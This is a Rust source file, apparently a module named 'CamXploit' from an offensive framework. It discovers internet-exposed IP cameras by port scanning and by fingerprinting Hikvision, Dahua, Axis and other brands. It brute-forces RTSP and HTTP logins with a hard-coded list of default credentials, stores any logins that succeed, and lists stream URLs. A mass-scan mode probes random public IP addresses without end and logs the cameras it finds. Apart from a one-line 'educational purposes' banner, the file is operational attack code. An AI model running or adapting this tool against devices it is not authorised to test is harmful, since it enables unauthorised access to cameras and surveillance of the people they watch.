use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::collections::{HashMap, HashSet};
use base64::prelude::*;
use crate::modules::creds::utils::{generate_random_public_ip, is_subnet_target, parse_subnet, subnet_host_count, EXCLUDED_RANGES};
use std::sync::atomic::{AtomicU64, Ordering};

use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{Mutex, Semaphore};
use tokio::time::timeout;

// =================================================================================
// CONSTANTS & DATA
// =================================================================================

const PORT_SCAN_TIMEOUT: u64 = 2;
const TIMEOUT: u64 = 5;

// Ports to ignore when filtering scan results — hosts with ONLY these ports open
// are not cameras and should be skipped in mass scan mode
const IGNORED_SERVICE_PORTS: &[u16] = &[22, 23, 3389]; // SSH, Telnet, RDP

const COMMON_PORTS: &[u16] = &[
    // Standard web ports
    80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
    8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
    // RTSP ports
    554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 9554,
    // RTMP ports
    1935, 1936, 1937, 1938, 1939,
    // Custom camera ports
    37777, 37778, 37779, 37780, 37781, 37782, 37783, 37784, 37785, 37786, 37787, 37788, 37789, 37790,
    37791, 37792, 37793, 37794, 37795, 37796, 37797, 37798, 37799, 37800,
    // ONVIF ports
    3702, 3703, 3704, 3705, 3706, 3707, 3708, 3709, 3710,
    // VLC streaming ports
    8100, 8110, 8120, 8130, 8140, 8150, 8160, 8170, 8180, 8190,
    // Common alternative ports
     110, 143, 993, 995,
    1024, 1025, 1026, 1027, 1028, 1029, 1030,
    2000, 2001, 2002, 2003, 2004, 2005,
    3000, 3001, 3002, 3003, 3004, 3005,
    4000, 4001, 4002, 4003, 4004, 4005,
    5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010,
    6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009, 6010,
    7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010,
    9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010,
    // Additional common ports
    8888, 8889, 8890, 8891, 8892, 8893, 8894, 8895, 8896, 8897, 8898, 8899,
    9999, 9998, 9997, 9996, 9995, 9994, 9993, 9992, 9991, 9990,
    // MMS ports
    1755, 1756, 1757, 1758, 1759, 1760,
    // High ports
    20000, 20001, 30000, 30001, 40000, 40001, 50000, 50001, 60000, 60001
];

const HTTPS_PORTS: &[u16] = &[443, 8443, 8444];

const COMMON_PATHS: &[&str] = &[
    "/", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live", "/snapshot", 
    "/onvif-http/snapshot", "/system.ini", "/config", "/setup", "/cgi-bin/", "/api/", 
    "/camera", "/img/main.cgi", "/cgi-bin/admin/mjpeg.cgi", "/cgi-bin/snapshot.cgi",
    "/videostream.cgi", "/axis-cgi/mjpg/video.cgi", "/video.cgi", "/image.jpg"
];

// Default credentials
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "1234567"),
    ("admin", "12345678"),
    ("admin", "123456789"),
    ("admin", "admin123"),
    ("admin", "admin1234"),
    ("admin", "admin12345"),
    ("admin", "password"),
    ("admin", "pass"),
    ("admin", "123"),
    ("admin", "1111"),
    ("admin", "0000"),
    ("admin", "8888"),
    ("admin", "default"),
    ("admin", "admin@123"),
    ("admin", "Admin123"),
    ("admin", "Admin1234"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "4321"),
    ("admin", "9999"),
    ("admin", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "1234"),
    ("root", "12345"),
    ("root", "123456"),
    ("root", "pass"),
    ("root", "password"),
    ("root", "root123"),
    ("root", "admin"),
    ("root", "1111"),
    ("root", "0000"),
    ("root", ""),
    ("user", "user"),
    ("user", "user123"),
    ("user", "password"),
    ("user", "1234"),
    ("user", "12345"),
    ("user", "123456"),
    ("user", ""),
    ("guest", "guest"),
    ("guest", "guest123"),
    ("guest", "1234"),
    ("guest", "12345"),
    ("guest", "123456"),
    ("guest", ""),
    ("operator", "operator"),
    ("operator", "operator123"),
    ("operator", "1234"),
    ("operator", "12345"),
    ("administrator", "administrator"),
    ("administrator", "admin"),
    ("administrator", "1234"),
    ("administrator", "12345"),
    ("administrator", "123456"),
    ("administrator", "password"),
    ("supervisor", "supervisor"),
    ("supervisor", "1234"),
    ("supervisor", "12345"),
    ("supervisor", "123456"),
    ("supervisor", "password"),
    ("support", "support"),
    ("support", "support123"),
    ("support", "1234"),
    ("support", "password"),
    ("system", "system"),
    ("system", "system123"),
    ("system", "1234"),
    ("system", "12345"),
    ("system", "123456"),
    ("viewer", "viewer"),
    ("viewer", "viewer123"),
    ("viewer", "1234"),
    ("viewer", "12345"),
    ("admin1", "admin"),
    ("admin1", "admin1"),
    ("admin1", "1234"),
    ("admin1", "12345"),
    ("admin1", "123456"),
    ("admin1", "password"),
    ("888888", "888888"),
    ("888888", "123456"),
    ("888888", "000000"),
    ("666666", "666666"),
    ("666666", "123456"),
    ("666666", "000000"),
    ("", "admin"),
    ("", "12345"),
    ("", "123456"),
];

pub async fn run(target: &str) -> Result<()> {
    if crate::utils::get_global_source_port().await.is_some() {
        crate::mprintln!("{}", "[*] Note: source_port does not apply to HTTP connections.".dimmed());
    }
    let target = target.trim().to_string();
    print_banner();

    // Subnet handling — iterate over each IP in the CIDR
    if is_subnet_target(&target) {
        let network = parse_subnet(&target)?;
        let count = subnet_host_count(&network);
        crate::mprintln!("{}", format!("[*] Subnet {} — {} hosts to scan sequentially", target, count).cyan());
        for ip in network.iter() {
            let ip_str = ip.to_string();
            crate::mprintln!("\n{}", format!("[*] >>> Scanning host: {}", ip_str).cyan().bold());
            if let Err(e) = Box::pin(run(&ip_str)).await {
                crate::mprintln!("{}", format!("[!] Error on {}: {}", ip_str, e).yellow());
            }
        }
        crate::mprintln!("\n{}", "[*] Subnet scan complete.".green().bold());
        return Ok(());
    }

    if target == "0.0.0.0" || target == "0.0.0.0/0" {
        return run_mass_scan().await;
    }

    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // 1. Port Scan
    crate::mprintln!("{}", format!("\n[*] Scanning {} ports...", COMMON_PORTS.len()).yellow());
    let (open_ports, rtsp_ports) = check_ports(&target).await;

    if open_ports.is_empty() {
        crate::mprintln!("{}", "[-] No open camera ports found.".red());
        crate::mprintln!("{}", "[!] Ensure the target is online and not behind a strict firewall.".yellow());
        return Ok(());
    }

    crate::mprintln!("{}", format!("\n[+] Found {} open ports: {:?}", open_ports.len(), open_ports).green());

    // 2. Camera Detection & Fingerprinting
    let client = create_client()?;
    let is_camera = check_if_camera(&target, &open_ports, &client).await;
    
    if !is_camera {
        crate::mprintln!("{}", "\n[-] Target does not appear to be a camera based on initial checks.".yellow());
        crate::mprintln!("{}", "[*] Proceeding with additional checks...".cyan());
    }

    check_login_pages(&target, &open_ports, &client).await;
    fingerprint_camera(&target, &open_ports, &client).await;
 
    // 3. Credential Testing
    test_default_passwords(&target, &open_ports, &rtsp_ports, &client).await;

    // 4. Stream Detection
    detect_live_streams(&target, &open_ports, &rtsp_ports, &client).await;

    // 5. Additional Information


    crate::mprintln!("{}", "\n[✅] Scan Completed!".green().bold());
    Ok(())
}

fn print_banner() {
    crate::mprintln!("{}", "\n╔══════════════════════════════════════════════════════════════╗".green().bold());
    crate::mprintln!("{}", "║  💀 CamXploit Rust Port - Camera Exploitation Scanner      ║".green().bold());
    crate::mprintln!("{}", "║  🔍 Discover open CCTV cameras & security flaws            ║".cyan().bold());
    crate::mprintln!("{}", "║  ⚠️  For educational & security research purposes only!    ║".yellow().bold());
    crate::mprintln!("{}", "╚══════════════════════════════════════════════════════════════╝".green().bold());
}

fn create_client() -> Result<Client> {
    Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT))
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()
        .map_err(|e| anyhow::anyhow!(e))
}

fn get_protocol(port: u16) -> &'static str {
    if HTTPS_PORTS.contains(&port) { "https" } else { "http" }
}

fn get_port_service_map() -> HashMap<u16, (&'static str, &'static str)> {
    let mut map = HashMap::new();
    
    // Web ports
    map.insert(80, ("HTTP", " - Standard Web"));
    map.insert(443, ("HTTPS", " - Secure Web"));
    map.insert(8080, ("HTTP-Alt", " - Alternative HTTP"));
    map.insert(8443, ("HTTPS-Alt", " - Alternative HTTPS"));
    map.insert(8000, ("HTTP-Alt", ""));
    
    // RTSP ports
    map.insert(554, ("RTSP", " - Real Time Streaming Protocol"));
    map.insert(8554, ("RTSP-Alt", " - Alternative RTSP"));
    
    // RTMP ports
    map.insert(1935, ("RTMP", " - Real Time Messaging Protocol"));
    
    // Custom camera ports
    map.insert(37777, ("DVR", " - Common DVR/NVR Port"));
    
    // ONVIF
    map.insert(3702, ("ONVIF", " - Camera Discovery"));
    
    map
}

// =================================================================================
// PORT SCANNING
// =================================================================================

async fn check_ports(target: &str) -> (Vec<u16>, Vec<u16>) {
    let mut open_ports = Vec::new();
    let mut rtsp_ports = Vec::new();
    let semaphore = Arc::new(Semaphore::new(100)); // Concurrency limit
    let mut tasks = Vec::new();
    let target_arc = Arc::new(target.to_string());
    
    // Deduplicate ports
    let unique_ports: HashSet<u16> = COMMON_PORTS.iter().cloned().collect();
    let port_map = get_port_service_map();

    for port in unique_ports {
        let t = target_arc.clone();
        let sem = semaphore.clone();
        
        tasks.push(tokio::spawn(async move {
            let _permit = match sem.acquire().await {
                Ok(p) => p,
                Err(_) => return None,
            };
            let addr = format!("{}:{}", t, port);
            
            // Basic TCP Connect
            if crate::utils::network::tcp_connect(&addr, Duration::from_secs(PORT_SCAN_TIMEOUT)).await.is_ok() {
                // If open, probe for RTSP
                let is_rtsp = probe_rtsp(&t, port).await;
                return Some((port, is_rtsp));
            }
            None
        }));
    }

    for task in tasks {
        if let Ok(Some((port, is_rtsp))) = task.await {
            open_ports.push(port);
            if is_rtsp {
                rtsp_ports.push(port);
            }
            
            // Logging
            let (svc_name, svc_desc) = port_map.get(&port).unwrap_or(&("Unknown", ""));
            let rtsp_tag = if is_rtsp { " [RTSP DETECTED]".bright_green() } else { "".normal() };
            crate::mprintln!("  ✅ [OPEN] {}/tcp {}{}{}", port, svc_name, svc_desc, rtsp_tag);
        }
    }

    open_ports.sort();
    rtsp_ports.sort();
    (open_ports, rtsp_ports)
}

async fn probe_rtsp(target: &str, port: u16) -> bool {
    // Sends a minimal RTSP OPTIONS request
    let addr = format!("{}:{}", target, port);
    if let Ok(mut stream) = crate::utils::network::tcp_connect(&addr, Duration::from_secs(PORT_SCAN_TIMEOUT)).await {
        let request = format!(
            "OPTIONS rtsp://{}:{}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n",
            target, port
        );
        if stream.write_all(request.as_bytes()).await.is_err() { return false; }
        
        let mut buffer = [0u8; 2048];
        if let Ok(Ok(n)) = timeout(Duration::from_secs(PORT_SCAN_TIMEOUT), stream.read(&mut buffer)).await {
            if n > 0 {
                let response = String::from_utf8_lossy(&buffer[..n]);
                if response.contains("RTSP/1.0") || response.contains("Public:") || response.contains("Server:") {
                    return true;
                }
            }
        }
    }
    false
}

// =================================================================================
// FINGERPRINTING
// =================================================================================

async fn check_if_camera(target: &str, open_ports: &[u16], client: &Client) -> bool {
    crate::mprintln!("{}", "\n[📷] Analyzing Ports for Camera Indicators...".cyan());
    let found = Arc::new(Mutex::new(false));
    let mut tasks = Vec::new();

    for &port in open_ports {
        let t = target.to_string();
        let c = client.clone();
        let f = found.clone();
        
        tasks.push(tokio::spawn(async move {
            let protocol = get_protocol(port);
            let url = format!("{}://{}:{}", protocol, t, port);
            
            if let Ok(resp) = c.get(&url).send().await {
                let headers = format!("{:?}", resp.headers()).to_lowercase();
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default().to_lowercase();

                let mut indicators = false;
                
                // Server header indicators
                if headers.contains("hikvision") || headers.contains("dahua") || headers.contains("axis") || 
                   headers.contains("camera") || headers.contains("dvr") || headers.contains("nvr") ||
                   headers.contains("ipcam") || headers.contains("webcam") {
                    crate::mprintln!("    ✅ Camera Server Header detected on port {}", port);
                    indicators = true;
                }
                
                // Body indicators
                if body.contains("cp plus") || body.contains("cpplus") || body.contains("uvr") {
                     crate::mprintln!("    ✅ CP Plus indicator on port {}", port);
                     indicators = true;
                }

                if body.contains("webcam") || body.contains("surveillance") || body.contains("snapshot") ||
                   body.contains("ipcam") || body.contains("netcam") {
                     crate::mprintln!("    ✅ Camera keyword in body on port {}", port);
                     indicators = true;
                }
                
                // Auth requirement check
                if status == reqwest::StatusCode::UNAUTHORIZED {
                    crate::mprintln!("    ✅ Authentication required on port {} (potential camera)", port);
                    indicators = true;
                }

                if indicators {
                    let mut lock = f.lock().await;
                    *lock = true;
                }
            }
        }));
    }

    for task in tasks {
        if let Err(e) = task.await { crate::meprintln!("[!] Task error: {}", e); }
    }

    let result = *found.lock().await;
    result
}

async fn check_login_pages(target: &str, open_ports: &[u16], client: &Client) {
    crate::mprintln!("{}", "\n[🔍] Checking for authentication pages...".cyan());
    
    let mut found_count = 0;
    
    for &port in open_ports {
        let protocol = get_protocol(port);
        for path in COMMON_PATHS {
            let url = format!("{}://{}:{}{}", protocol, target, port, path);
            if let Ok(resp) = client.head(&url).send().await {
                let status = resp.status();
                if status.is_success() || status == reqwest::StatusCode::UNAUTHORIZED || 
                   status == reqwest::StatusCode::FORBIDDEN {
                    crate::mprintln!("  ✅ Found: {} (Status: {})", url, status);
                    found_count += 1;
                }
            }
        }
    }
    
    if found_count == 0 {
        crate::mprintln!("  {} No common login pages found", "[-]".yellow());
    }
}

async fn fingerprint_camera(target: &str, open_ports: &[u16], client: &Client) {
    crate::mprintln!("{}", "\n[📡] Fingerprinting Camera Type & Firmware...".cyan());
    
    let mut found_brand = false;
    
    for &port in open_ports {
        let protocol = get_protocol(port);
        let url = format!("{}://{}:{}", protocol, target, port);
        
        if let Ok(resp) = client.get(&url).send().await {
             let headers = format!("{:?}", resp.headers()).to_lowercase();
             let body = resp.text().await.unwrap_or_default().to_lowercase();
             
             if headers.contains("hikvision") || body.contains("hikvision") {
                 crate::mprintln!("🔥 {} on port {}!", "Hikvision Camera Detected".bright_red().bold(), port);
                 found_brand = true;
             } else if headers.contains("dahua") || body.contains("dahua") {
                 crate::mprintln!("🔥 {} on port {}!", "Dahua Camera Detected".bright_red().bold(), port);
                 found_brand = true;
             } else if headers.contains("axis") || body.contains("axis") {
                 crate::mprintln!("🔥 {} on port {}!", "Axis Camera Detected".bright_red().bold(), port);
                 found_brand = true;
             } else if body.contains("cp plus") || body.contains("cpplus") {
                 crate::mprintln!("🔥 {} on port {}!", "CP Plus Camera Detected".bright_red().bold(), port);
                 found_brand = true;
             } else if body.contains("foscam") || headers.contains("foscam") {
                 crate::mprintln!("🔥 {} on port {}!", "Foscam Camera Detected".bright_red().bold(), port);
                 found_brand = true;
             } else if body.contains("vivotek") || headers.contains("vivotek") {
                 crate::mprintln!("🔥 {} on port {}!", "Vivotek Camera Detected".bright_red().bold(), port);
                 found_brand = true;
             }
        }
    }
    
    if !found_brand {
        crate::mprintln!("  {} Could not identify specific camera brand", "[-]".yellow());
    }
}

// =================================================================================
// CREDENTIALS
// =================================================================================

async fn test_default_passwords(target: &str, open_ports: &[u16], rtsp_ports: &[u16], client: &Client) {
    crate::mprintln!("{}", "\n[🔑] Testing common credentials...".cyan());
    crate::mprintln!("{}", "[ℹ️] Prioritizing RTSP ports and Web ports with authentication.".yellow());

    let all_creds_vec = get_default_credentials();
    let all_creds = all_creds_vec.as_slice();
    let mut priority_creds = Vec::new();
    
    // Top priority credentials
    priority_creds.push(("admin", "admin"));
    priority_creds.push(("admin", "12345"));
    priority_creds.push(("admin", "123456"));
    priority_creds.push(("admin", ""));
    priority_creds.push(("root", "root"));
    priority_creds.push(("root", "12345"));
    priority_creds.push(("", "admin"));
    
    // Test RTSP ports first
    if !rtsp_ports.is_empty() {
        crate::mprintln!("{}", "\n[🎯] Testing RTSP Authentication...".cyan());
        for &port in rtsp_ports {
            for &(user, pass) in &priority_creds {
                if test_rtsp_auth(target, port, user, pass).await {
                    crate::mprintln!("🔥 {} RTSP {}:{} @ rtsp://{}:{}/",
                        "SUCCESS!".bright_green().bold(),
                        user,
                        if pass.is_empty() { "<empty>" } else { pass },
                        target,
                        port
                    );
                    {
                        let id = crate::cred_store::store_credential(
                            target, port, "rtsp", user, pass,
                            crate::cred_store::CredType::Password,
                            "creds/camxploit/camxploit",
                        ).await;
                        if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                    }
                }
            }
        }
    }
    
    // Test HTTP/HTTPS ports
    crate::mprintln!("{}", "\n[🎯] Testing HTTP Basic Auth...".cyan());
    for &port in open_ports {
        if rtsp_ports.contains(&port) {
            continue; // Already tested
        }
        
        let protocol = get_protocol(port);
        let url = format!("{}://{}:{}", protocol, target, port);
        
        // First check if auth is required
        if let Ok(resp) = client.get(&url).send().await {
            if resp.status() == reqwest::StatusCode::UNAUTHORIZED {
                // Try credentials
                // First try priority creds
                let mut tested = HashSet::new();
                for &(user, pass) in &priority_creds {
                    tested.insert((user, pass));
                    if let Ok(resp) = client.get(&url).basic_auth(user, Some(pass)).send().await {
                        if resp.status().is_success() {
                            crate::mprintln!("🔥 {} HTTP Basic {}:{} @ {}",
                                "SUCCESS!".bright_green().bold(),
                                user,
                                if pass.is_empty() { "<empty>" } else { pass },
                                url
                            );
                            {
                                let id = crate::cred_store::store_credential(
                                    target, port, "http", user, pass,
                                    crate::cred_store::CredType::Password,
                                    "creds/camxploit/camxploit",
                                ).await;
                                if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                            }
                        }
                    }
                }

                // Then try remaining creds from the full list
                for &(user, pass) in all_creds {
                    if tested.contains(&(user, pass)) { continue; }

                    if let Ok(resp) = client.get(&url).basic_auth(user, Some(pass)).send().await {
                        if resp.status().is_success() {
                             crate::mprintln!("🔥 {} HTTP Basic {}:{} @ {}",
                                "SUCCESS!".bright_green().bold(),
                                user,
                                if pass.is_empty() { "<empty>" } else { pass },
                                url
                            );
                            {
                                let id = crate::cred_store::store_credential(
                                    target, port, "http", user, pass,
                                    crate::cred_store::CredType::Password,
                                    "creds/camxploit/camxploit",
                                ).await;
                                if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                            }
                        }
                    }
                }
            }
        }
    }
}

async fn test_rtsp_auth(target: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("{}:{}", target, port);
    if let Ok(mut stream) = crate::utils::network::tcp_connect(&addr, Duration::from_secs(2)).await {
        let auth_str = BASE64_STANDARD.encode(format!("{}:{}", user, pass));
        let request = format!(
            "OPTIONS rtsp://{}:{}/ RTSP/1.0\r\nAuthorization: Basic {}\r\nCSeq: 1\r\n\r\n",
            target, port, auth_str
        );
        if stream.write_all(request.as_bytes()).await.is_ok() {
            let mut buffer = [0u8; 2048];
            if let Ok(Ok(n)) = timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
                 let response = String::from_utf8_lossy(&buffer[..n]);
                 if response.contains("RTSP/1.0 200 OK") {
                     return true;
                 }
            }
        }
    }
    false
}

// =================================================================================
// STREAM DETECTION
// =================================================================================

async fn detect_live_streams(target: &str, open_ports: &[u16], rtsp_ports: &[u16], client: &Client) {
    crate::mprintln!("{}", "\n[🎥] Detecting Live Streams...".cyan());

    // Show RTSP links
    if !rtsp_ports.is_empty() {
        crate::mprintln!("{}", "\n[🎯] RTSP Ports Found - Potential RTSP URLs:".bright_cyan());
        let common_paths = [
            "/", 
            "/live.sdp", 
            "/h264.sdp", 
            "/stream1", 
            "/Streaming/Channels/1",
            "/Streaming/Channels/101",
            "/cam/realmonitor",
            "/live/ch00_0",
            "/livestream",
            "/axis-media/media.amp"
        ];
        
        for &port in rtsp_ports {
            for path in common_paths {
                 crate::mprintln!("  🎥 RTSP: rtsp://{}:{}{}", target, port, path);
            }
        }
        crate::mprintln!("{}", "     💡 Tip: Use VLC Media Player (Media -> Open Network Stream) to test these URLs".yellow());
    }

    // Check HTTP streams on open ports
    crate::mprintln!("{}", "\n[🔍] Checking HTTP/HTTPS Streams...".cyan());
    let stream_paths = [
        "/video", 
        "/stream", 
        "/live", 
        "/mjpg/video.mjpg", 
        "/snapshot.jpg",
        "/videostream.cgi",
        "/video.cgi",
        "/image.jpg",
        "/cgi-bin/mjpeg",
        "/axis-cgi/mjpg/video.cgi"
    ];

    let mut found_streams = false;

    for &port in open_ports {
        let protocol = get_protocol(port);
        for path in stream_paths {
             let url = format!("{}://{}:{}{}", protocol, target, port, path);
             // Use head first
             if let Ok(resp) = client.head(&url).send().await {
                 let status = resp.status();
                 if status.is_success() || status == reqwest::StatusCode::UNAUTHORIZED {
                     let ct = resp.headers().get("content-type")
                         .and_then(|h| h.to_str().ok())
                         .unwrap_or("");
                     
                     if ct.contains("video") || ct.contains("stream") || ct.contains("image") || ct.contains("mjpeg") {
                         crate::mprintln!("  ✅ Potential Stream: {} (Type: {})", url, ct);
                         found_streams = true;
                     } else if status == reqwest::StatusCode::UNAUTHORIZED {
                         crate::mprintln!("  ⚠️  Protected Stream: {} (Auth Required)", url);
                         found_streams = true;
                     }
                 }
             }
        }
    }
    
    if !found_streams && rtsp_ports.is_empty() {
        crate::mprintln!("  {} No live streams detected", "[-]".yellow());
    }
}



// =================================================================================
// HELPER FUNCTIONS
// =================================================================================

fn get_default_credentials() -> Vec<(&'static str, &'static str)> {
    DEFAULT_CREDENTIALS.to_vec()
}

// =================================================================================
// MASS SCAN FUNCTIONS
// =================================================================================

/// Build parsed exclusion list from EXCLUDED_RANGES
fn build_exclusion_list() -> Vec<ipnetwork::IpNetwork> {
    EXCLUDED_RANGES.iter()
        .filter_map(|cidr| cidr.parse::<ipnetwork::IpNetwork>().ok())
        .collect()
}



/// Check if all open ports are in the ignored services list (SSH/Telnet/RDP)
/// Returns true if the host should be skipped (only non-camera services found)
fn is_only_ignored_services(open_ports: &[u16]) -> bool {
    if open_ports.is_empty() {
        return true;
    }
    open_ports.iter().all(|p| IGNORED_SERVICE_PORTS.contains(p))
}

async fn run_mass_scan() -> Result<()> {
    crate::mprintln!("{}", "=== MASS SCAN MODE ACTIVATED ===".red().bold().blink());
    crate::mprintln!("{}", "WARNING: This will scan random IP addresses indefinitely.".yellow());
    crate::mprintln!("{}", "[*] Excluded ranges: bogons, private, reserved, documentation, public DNS".cyan());
    crate::mprintln!("{}", "[*] Service filter: hosts with only SSH/Telnet/RDP will be skipped".cyan());
    crate::mprintln!();

    // Build exclusion list
    let exclusions = build_exclusion_list();
    crate::mprintln!("{}", format!("[+] Loaded {} IP exclusion ranges", exclusions.len()).green());

    // Prompt for thread count
    let thread_count = crate::utils::cfg_prompt_int_range("concurrency", "Threads", 200, 1, 5000).await? as usize;

    // Prompt for output file
    let output_file = crate::utils::cfg_prompt_output_file(
        "output_file",
        "Output file for discovered cameras",
        "camxploit_results.txt",
    ).await?;

    crate::mprintln!("{}", format!(
        "[*] Starting mass scan with {} threads... Press Ctrl+C to stop.",
        thread_count
    ).cyan());
    crate::mprintln!();

    let exclusions = Arc::new(exclusions);
    let scanned_count = Arc::new(AtomicU64::new(0));
    let found_count = Arc::new(AtomicU64::new(0));
    let skipped_service_count = Arc::new(AtomicU64::new(0));
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let output_file = Arc::new(output_file);

    // Progress reporter task (time-based, every 10 seconds)
    {
        let scanned = scanned_count.clone();
        let found = found_count.clone();
        let skipped = skipped_service_count.clone();
        let start_time = Instant::now();
        tokio::spawn(async move {
            loop {
                tokio::time::sleep(Duration::from_secs(10)).await;
                let total = scanned.load(Ordering::Relaxed);
                let elapsed = start_time.elapsed().as_secs().max(1);
                let rate = total / elapsed;
                crate::mprintln!(
                    "[*] Progress: {} scanned | {} cameras found | {} skipped (non-camera) | {} IPs/sec",
                    total,
                    found.load(Ordering::Relaxed),
                    skipped.load(Ordering::Relaxed),
                    rate
                );
            }
        });
    }

    // Infinite parallel scan loop
    loop {
        let permit = semaphore.clone().acquire_owned().await
            .map_err(|e| anyhow::anyhow!("Semaphore closed: {}", e))?;
        let exc = exclusions.clone();
        let scanned = scanned_count.clone();
        let found = found_count.clone();
        let skipped = skipped_service_count.clone();
        let outfile = output_file.clone();

        tokio::spawn(async move {
            let ip = generate_random_public_ip(&exc);
            let target = ip.to_string();

            // Parallel port scan
            let (open_ports, rtsp_ports) = check_ports(&target).await;
            scanned.fetch_add(1, Ordering::Relaxed);

            if open_ports.is_empty() {
                drop(permit);
                return;
            }

            // Service filter: skip if only SSH/Telnet/RDP are open
            if is_only_ignored_services(&open_ports) {
                skipped.fetch_add(1, Ordering::Relaxed);
                drop(permit);
                return;
            }

            crate::mprintln!(
                "{}",
                format!(
                    "\n[+] Target: {} - {} open ports (camera-relevant): {:?}",
                    target,
                    open_ports.len(),
                    open_ports
                )
                .green()
                .bold()
            );

            let client = match create_client() {
                Ok(c) => c,
                Err(e) => {
                    crate::meprintln!("Failed to create client: {}", e);
                    drop(permit);
                    return;
                }
            };

            // Camera detection & fingerprinting
            let is_camera = check_if_camera(&target, &open_ports, &client).await;
            check_login_pages(&target, &open_ports, &client).await;
            fingerprint_camera(&target, &open_ports, &client).await;

            // Credential testing
            test_default_passwords(&target, &open_ports, &rtsp_ports, &client).await;

            // Stream detection
            detect_live_streams(&target, &open_ports, &rtsp_ports, &client).await;

            // Record discovered camera
            if is_camera || !rtsp_ports.is_empty() {
                found.fetch_add(1, Ordering::Relaxed);
                // Save to output file
                if let Ok(mut file) = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(outfile.as_str())
                {
                    use std::io::Write;
                    if let Err(e) = writeln!(
                        file,
                        "CAMERA: {} | ports: {:?} | rtsp: {:?}",
                        target, open_ports, rtsp_ports
                    ) { crate::meprintln!("[!] Write error: {}", e); }
                }
            }

            drop(permit);
        });
    }
}

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "CamXploit — Camera Discovery & Credential Scanner".to_string(),
        description: "Comprehensive IP camera discovery, fingerprinting, and default credential testing across RTSP, HTTP, and HTTPS. Supports Hikvision, Dahua, Axis, CP Plus, Foscam, Vivotek, and generic cameras.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Great,
    }
}